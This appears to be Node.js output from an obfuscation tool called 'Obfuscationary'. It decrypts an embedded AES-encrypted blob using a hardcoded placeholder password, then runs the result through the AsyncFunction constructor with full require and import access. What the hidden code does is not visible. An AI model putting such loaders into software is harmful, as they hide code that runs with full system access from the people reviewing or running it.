// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 4.1.1                                     ║
// ║  Encrypted: 2026-07-27 21:34:32 UTC                   ║
// ║  Cipher   : PBKDF2+AES-256-GCM                        ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v4.1.1
(async()=>{
  if(typeof require==='undefined')throw new Error('[Obfuscationary] Use Node.js.');
  const _b64='T0JGdjR0uzfAavgD+H6/mfDji8XG2zEFlzBxmAEoDUh1wMCHCEb1NcY8+o9G6BLz8Eq7kLDq1uH6tfMG6He2jgbN/Ds3Bnd2g6oxOG8scIWI5LS4EJ7dxq6WFixXwT06f7oA2WUZ6kv7s4DPrmlHals2sm0qyaOLtul1rYQu1szMq5RkVV62UvFPIDYV6SWeqgpKEly4kQCFRrzXj8Xfujc/R0gasBgrCo9lGo5qSNyiFuy69w7aLaSMr2r0fE2xb0gqNVmlxkq6pbj5Jyq0vww6WVBOBMKaYimIsVqukcGBiq5jRDZIVFO45RH6sWMi1eiPhbUxAEJN58MeDDV+lfobRcB/5+g7ibHPjeOxNruIrWIQFkFgG5RGUu4tEiyYv8wXJU5eyBuBuS/oYRtRBW+sUvyxkaWJLRH/7hBOlmfvN7TFft6+U//2XlO+Flrn3VU6xFXdr8u4Mu9ySd6/9L4BgA0J3io27ATlQL7yIpXMtC8yBVPQ+a1liOC5qJc5qp0UH00hrm6ezcPojr+lR1BajNSNK3OUsCmwirZcV4BZFqOBm+uD/ChRZ8KSo9hVupeFW/YwkfgaLw5+JsffQlTQMdukPYCADl8SuklYdMAsVUu2Sa05ZOy+V0n34YiUQJx8ypXk/cqp6zj7md3Z51DEl1SzvlHFOfXqI4wHknlBoZWyd3epnI7WTw7rdz5CiSC5a15X6qA4Rpld5JJ51dKdv1DresLsrDy64gbQPF8FdD016HbhT+x/EU5iR2GvUlm02vObvSC0ZSnuvm9TXL3vYxlXi1GgWRzshXKZl+iwsqmXN5linWR2iopaA7J7C3rWwqtrhvJWaShaoRinQjdVsmoxSoSFkAp1AZwMMaj9yhUHUlxg7RkcZzHZ9w0gRoOHOKcS7qpYj/bTU8s66HMfWvR9LSrakwI7pYC3wYJpaLcNEPxay+5ynCF4kj5Q+unCMFXybnhwLQx+9sJ0r4UkwLTYRbae39eBGTqOc9NOkue6';const _IH='8b21e7380513b08419513bd5666ee2856c56f9f4fcb53936dc86321d14cc5496';let _src;

  const _PWDS=["change_this_to_a_long_random_secret"];
  const _MAGIC="OBFv4";
  const _c2=require('crypto');
  const _ah=_c2.createHash('sha256').update(_b64).digest('hex');
  if(_ah!==_IH)throw new Error('[Obfuscationary] Tamper detected!');
  let _d=Buffer.from(_b64,'base64');
  for(let i=_PWDS.length-1;i>=0;i--){
    const pw=_PWDS[i];
    if(!_d.toString('utf8',0,5).startsWith(_MAGIC))throw new Error('[Obfuscationary] Bad header');
    const blob=_d.slice(5);
    const s=blob.slice(0,16), iv=blob.slice(16,28), ct=blob.slice(28);
    const kk=_c2.pbkdf2Sync(pw,s,100000,32,'sha256');
    const dc=_c2.createDecipheriv('aes-256-gcm',kk,iv);
    const tag=ct.slice(ct.length-16), cdata=ct.slice(0,ct.length-16);
    dc.setAuthTag(tag);
    _d=Buffer.concat([dc.update(cdata),dc.final()]);
  }
  _src=_d.toString('utf8');

  const _import=(m)=>import(m);
  const _F=Object.getPrototypeOf(async function(){}).constructor;
  await _F('module','exports','require','__filename','__dirname','_import',_src)(module,exports,require,__filename,__dirname,_import);
})();
